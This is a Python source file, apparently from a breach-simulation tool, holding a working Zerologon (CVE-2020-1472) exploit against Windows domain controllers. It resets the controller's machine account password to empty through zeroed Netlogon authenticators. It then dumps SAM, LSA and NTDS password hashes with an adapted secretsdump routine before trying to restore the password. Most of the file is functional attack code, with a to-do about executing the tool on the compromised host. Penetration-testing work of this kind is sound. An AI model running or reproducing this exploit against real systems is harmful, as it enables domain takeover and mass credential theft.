"""
Zerologon, CVE-2020-1472
Implementation based on https://github.com/dirkjanm/CVE-2020-1472/ and https://github.com/risksense/zerologon/.
"""

from __future__ import division, print_function

import argparse
import codecs
import io
import logging
import os
import re
import sys
from binascii import hexlify, unhexlify

import impacket
from Cryptodome.Cipher import AES, ARC4, DES
from impacket import crypto, version
from impacket.dcerpc.v5 import epm, nrpc, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.examples import logger
from impacket.examples.secretsdump import (LocalOperations, LSASecrets,
                                           NTDSHashes, RemoteOperations,
                                           SAMHashes)
from impacket.krb5.keytab import Keytab
from impacket.smbconnection import SMBConnection

from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.network.zerologon_fingerprint import ZerologonFinger

LOG = logging.getLogger(__name__)


class ZerologonExploiter(HostExploiter):
    _TARGET_OS_TYPE = ['windows']
    _EXPLOITED_SERVICE = 'Netlogon'
    MAX_ATTEMPTS = 2000
    OPTIONS_FOR_SECRETSDUMP =\
        {
            'aes_key': None,
            'bootkey': None,
            'dc_ip': None,
            'debug': False,
            'exec_method': 'smbexec',
            'hashes': None,
            'history': False,
            'just_dc': True,
            'just_dc_ntlm': False,
            'just_dc_user': None,
            'k': False,
            'keytab': None,
            'no_pass': True,
            'ntds': None,
            'outputfile': None,
            'pwd_last_set': False,
            'resumefile': None,
            'sam': None,
            'security': None,
            'system': None,
            # target and target_ip are assigned in get_original_pwd_nthash()
            'ts': False,
            'use_vss': False,
            'user_status': False
        }

    def __init__(self, host):
        super().__init__(host)
        self.vulnerable_port = None
        self.zerologon_finger = ZerologonFinger()

    def _exploit_host(self):
        DC_IP, DC_NAME, DC_HANDLE = self.get_dc_details()

        if self.is_exploitable():
            LOG.info("Target vulnerable, changing account password to empty string.")

            # Connect to the DC's Netlogon service.
            rpc_con = self.connect_to_dc(DC_IP)

            # Start exploiting attempts.
            # Max attempts = 2000. Expected average number of attempts needed: 256.
            result = None
            for _ in range(0, self.MAX_ATTEMPTS):
                try:
                    result = self.attempt_exploit(DC_HANDLE, rpc_con, DC_NAME)
                except nrpc.DCERPCSessionError as ex:
                    # Failure should be due to a STATUS_ACCESS_DENIED error.
                    # Otherwise, the attack is probably not working.
                    if ex.get_error_code() != 0xc0000022:
                        LOG.info(f"Unexpected error code from DC: {ex.get_error_code()}")
                except BaseException as ex:
                    LOG.info(f"Unexpected error: {ex}")

                if result is not None:
                    break

            LOG.debug(f"Result error code: {result['ErrorCode']}")
            if result['ErrorCode'] == 0:
                LOG.info("Exploit complete!")
            else:
                LOG.info("Non-zero return code, something went wrong.")

            # restore password
            self.restore_password(DC_HANDLE, DC_IP, DC_NAME)

            ## how do i execute monkey on the exploited machine?

        else:
            LOG.info("Exploit failed. Target is either patched or an unexpected error was encountered.")

    def get_dc_details(self):
        dc_ip = self.host.ip_addr
        dc_name = self.zerologon_finger.get_dc_name(dc_ip)
        dc_handle = '\\\\' + dc_name
        return dc_ip, dc_name, dc_handle

    def is_exploitable(self):
        return self.zerologon_finger.get_host_fingerprint(self.host)

    def connect_to_dc(self, DC_IP):
        binding = epm.hept_map(DC_IP, nrpc.MSRPC_UUID_NRPC,
                               protocol='ncacn_ip_tcp')
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
        return rpc_con

    def attempt_exploit(self, DC_HANDLE, rpc_con, DC_NAME):
        request = nrpc.NetrServerPasswordSet2()
        request['PrimaryName'] = DC_HANDLE + '\x00'
        request['AccountName'] = DC_NAME + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00' * 8
        authenticator['Timestamp'] = 0
        request['Authenticator'] = authenticator
        request['ComputerName'] = DC_NAME + '\x00'
        request['ClearNewPassword'] = b'\x00' * 516
        return rpc_con.request(request)

    def restore_password(self, DC_HANDLE, DC_IP, DC_NAME):
        # Keep authenticating until successful.
        LOG.info("Restoring original password...")

        LOG.info("DCSync; getting original password hashes.")
        original_pwd_nthash = self.get_original_pwd_nthash(DC_NAME, DC_IP)

        try:
            if not original_pwd_nthash:
                raise Exception("Couldn't extract nthash of original password.")

            for _ in range(0, self.MAX_ATTEMPTS):
                rpc_con = self.attempt_restoration(DC_HANDLE, DC_IP, DC_NAME, original_pwd_nthash)
                if rpc_con is not None:
                    break

            if rpc_con:
                LOG.info("DC machine account password should be restored to its original value.")
            else:
                LOG.info("Failed to restore password.")

        except Exception as e:
            LOG.error(e)

    def get_original_pwd_nthash(self, DC_NAME, DC_IP):
        dumped_secrets = self.get_dumped_secrets(DC_NAME, DC_IP)
        for secret in dumped_secrets:
            if DC_NAME in secret:
                nthash = secret.split(':')[3]  # format of secret hashes - "domain\uid:rid:lmhash:nthash:::"
                return nthash

    def get_dumped_secrets(self, DC_NAME, DC_IP):
        self.OPTIONS_FOR_SECRETSDUMP['target'] = '$@'.join([DC_NAME, DC_IP])  # format for DC account - "NetBIOSName$@0.0.0.0"
        self.OPTIONS_FOR_SECRETSDUMP['target_ip'] = DC_IP

        domain, username, password, remote_name = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
            self.OPTIONS_FOR_SECRETSDUMP['target']).groups('')

        # In case the password contains '@'
        if '@' in remote_name:
            password = password + '@' + remote_name.rpartition('@')[0]
            remote_name = remote_name.rpartition('@')[2]

        dumper = DumpSecrets(remote_name, username, password, domain, self.OPTIONS_FOR_SECRETSDUMP)
        dumped_secrets = dumper.dump().split('\n')
        return dumped_secrets

    def attempt_restoration(self, DC_HANDLE, DC_IP, DC_NAME, original_pwd_nthash):
        # Connect to the DC's Netlogon service.
        rpc_con = self.connect_to_dc(DC_IP)

        plaintext = b'\x00'*8
        ciphertext = b'\x00'*8
        flags = 0x212fffff

        # Send challenge and authentication request.
        server_challenge_response = nrpc.hNetrServerReqChallenge(rpc_con, DC_HANDLE + '\x00',
                                                                 DC_NAME + '\x00', plaintext)
        server_challenge = server_challenge_response['ServerChallenge']

        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                rpc_con, DC_HANDLE + '\x00', DC_NAME + '$\x00',
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                DC_NAME + '\x00', ciphertext, flags
            )

            # It worked!
            assert server_auth['ErrorCode'] == 0
            server_auth.dump()
            session_key = nrpc.ComputeSessionKeyAES(None, b'\x00'*8, server_challenge,
                                                    unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))

            try:
                authenticator = nrpc.NETLOGON_AUTHENTICATOR()
                authenticator['Credential'] = ciphertext
                authenticator['Timestamp'] = b"\x00" * 4

                nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
                nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)

                request = NetrServerPasswordSet()
                request['PrimaryName'] = NULL
                request['AccountName'] = DC_NAME + '$\x00'
                request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
                request['ComputerName'] = DC_NAME + '\x00'
                request["Authenticator"] = authenticator
                pwd_data = impacket.crypto.SamEncryptNTLMHash(unhexlify(original_pwd_nthash), sessionKey)
                request["UasNewPassword"] = pwd_data
                resp = rpc_con.request(request)
                resp.dump()

            except Exception as ex:
                LOG.info(f"Unexpected error: {ex}")

            return rpc_con

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error; otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xc0000022:
                return None
            else:
                LOG.info(f"Unexpected error code from DC: {ex.get_error_code()}")

        except BaseException as ex:
            LOG.info(f"Unexpected error: {ex}")


class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ('PrimaryName', nrpc.PLOGONSRV_HANDLE),
        ('AccountName', nrpc.WSTR),
        ('SecureChannelType', nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ('ComputerName', nrpc.WSTR),
        ('Authenticator', nrpc.NETLOGON_AUTHENTICATOR),
        ('UasNewPassword', nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )


class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ('ReturnAuthenticator', nrpc.NETLOGON_AUTHENTICATOR),
        ('ErrorCode', nrpc.NTSTATUS),
    )


# Adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
# Used to get original password hash
class DumpSecrets:
    def __init__(self, remote_name, username='', password='', domain='', options=None):
        self.__use_VSS_method = options['use_vss']
        self.__remote_name = remote_name
        self.__remote_host = options['target_ip']
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aes_key = options['aes_key']
        self.__smb_connection = None
        self.__remote_ops = None
        self.__SAM_hashes = None
        self.__NTDS_hashes = None
        self.__LSA_secrets = None
        self.__system_hive = options['system']
        self.__bootkey = options['bootkey']
        self.__security_hive = options['security']
        self.__sam_hive = options['sam']
        self.__ntds_file = options['ntds']
        self.__history = options['history']
        self.__no_lmhash = True
        self.__is_remote = True
        self.__output_file_name = options['outputfile']
        self.__do_kerberos = options['k']
        self.__just_DC = options['just_dc']
        self.__just_DC_NTLM = options['just_dc_ntlm']
        self.__just_user = options['just_dc_user']
        self.__pwd_last_set = options['pwd_last_set']
        self.__print_user_status = options['user_status']
        self.__resume_file_name = options['resumefile']
        self.__can_process_SAM_LSA = True
        self.__kdc_host = options['dc_ip']
        self.__options = options

        if options['hashes'] is not None:
            self.__lmhash, self.__nthash = options['hashes'].split(':')

    def connect(self):
        self.__smb_connection = SMBConnection(self.__remote_name, self.__remote_host)
        if self.__do_kerberos:
            self.__smb_connection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                self.__nthash, self.__aes_key, self.__kdc_host)
        else:
            self.__smb_connection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        orig_stdout = sys.stdout
        new_stdout = io.StringIO()
        sys.stdout = new_stdout  # setting stdout to an in-memory text stream, to capture hashes that would else be printed
        dumped_secrets = ''

        try:
            if self.__remote_name.upper() == 'LOCAL' and self.__username == '':
                self.__is_remote = False
                self.__use_VSS_method = True
                if self.__system_hive:
                    local_operations = LocalOperations(self.__system_hive)
                    bootkey = local_operations.getBootKey()
                    if self.__ntds_file is not None:
                        # Let's grab target's configuration about LM Hashes storage
                        self.__no_lmhash = local_operations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootkey = binascii.unhexlify(self.__bootkey)

            else:
                self.__is_remote = True
                bootkey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__do_kerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            LOG.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remote_ops = RemoteOperations(self.__smb_connection, self.__do_kerberos, self.__kdc_host)
                    self.__remote_ops.setExecMethod(self.__options['exec_method'])
                    if self.__just_DC is False and self.__just_DC_NTLM is False or self.__use_VSS_method is True:
                        self.__remote_ops.enableRegistry()
                        bootkey = self.__remote_ops.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__no_lmhash = self.__remote_ops.checkNoLMHashPolicy()
                except Exception as e:
                    self.__can_process_SAM_LSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                            and self.__do_kerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        LOG.error('Policy SPN target name validation might be restricting full DRSUAPI dump.' +
                                  'Try -just-dc-user')
                    else:
                        LOG.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract SAM and LSA
            if self.__just_DC is False and self.__just_DC_NTLM is False and self.__can_process_SAM_LSA:
                try:
                    if self.__is_remote is True:
                        SAM_file_name = self.__remote_ops.saveSAM()
                    else:
                        SAM_file_name = self.__sam_hive

                    self.__SAM_hashes = SAMHashes(SAM_file_name, bootkey, isRemote=self.__is_remote)
                    self.__SAM_hashes.dump()
                    if self.__output_file_name is not None:
                        self.__SAM_hashes.export(self.__output_file_name)
                except Exception as e:
                    LOG.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__is_remote is True:
                        SECURITY_file_name = self.__remote_ops.saveSECURITY()
                    else:
                        SECURITY_file_name = self.__security_hive

                    self.__LSA_secrets = LSASecrets(SECURITY_file_name, bootkey, self.__remote_ops,
                                                    isRemote=self.__is_remote, history=self.__history)
                    self.__LSA_secrets.dumpCachedHashes()
                    if self.__output_file_name is not None:
                        self.__LSA_secrets.exportCached(self.__output_file_name)
                    self.__LSA_secrets.dumpSecrets()
                    if self.__output_file_name is not None:
                        self.__LSA_secrets.exportSecrets(self.__output_file_name)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    LOG.error('LSA hashes extraction failed: %s' % str(e))

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__is_remote is True:
                if self.__use_VSS_method and self.__remote_ops is not None:
                    NTDS_file_name = self.__remote_ops.saveNTDS()
                else:
                    NTDS_file_name = None
            else:
                NTDS_file_name = self.__ntds_file

            self.__NTDS_hashes = NTDSHashes(NTDS_file_name, bootkey, isRemote=self.__is_remote, history=self.__history,
                                            noLMHash=self.__no_lmhash, remoteOps=self.__remote_ops,
                                            useVSSMethod=self.__use_VSS_method, justNTLM=self.__just_DC_NTLM,
                                            pwdLastSet=self.__pwd_last_set, resumeSession=self.__resume_file_name,
                                            outputFileName=self.__output_file_name, justUser=self.__just_user,
                                            printUserStatus=self.__print_user_status)
            try:
                self.__NTDS_hashes.dump()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resume_file = self.__NTDS_hashes.getResumeSessionFile()
                    if resume_file is not None:
                        os.unlink(resume_file)
                logging.error(e)
                if self.__just_user and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                    LOG.error("You just got that error because there might be some duplicates of the same name. "
                              "Try specifying the domain name for the user as well. It is important to specify it "
                              "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                elif self.__use_VSS_method is False:
                    LOG.error('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            import traceback
            print(traceback.format_exc())
            LOG.error(e)
            if self.__NTDS_hashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    resume_file = self.__NTDS_hashes.getResumeSessionFile()
                    if resume_file is not None:
                        os.unlink(resume_file)
            try:
                self.cleanup()
            except:
                pass
        finally:
            sys.stdout = orig_stdout
            new_stdout.seek(0)
            dumped_secrets = new_stdout.read()  # includes hashes and kerberos keys
            return dumped_secrets

    def cleanup(self):
        LOG.info('Cleaning up...')
        if self.__remote_ops:
            self.__remote_ops.finish()
        if self.__SAM_hashes:
            self.__SAM_hashes.finish()
        if self.__LSA_secrets:
            self.__LSA_secrets.finish()
        if self.__NTDS_hashes:
            self.__NTDS_hashes.finish()

# how to execute monkey on exploited machine
# clean up logging
# mention in report explicitly - machine exploited/not (return True, if yes) & password restored/not
# mention patching details in report
# add exploit info to documentation
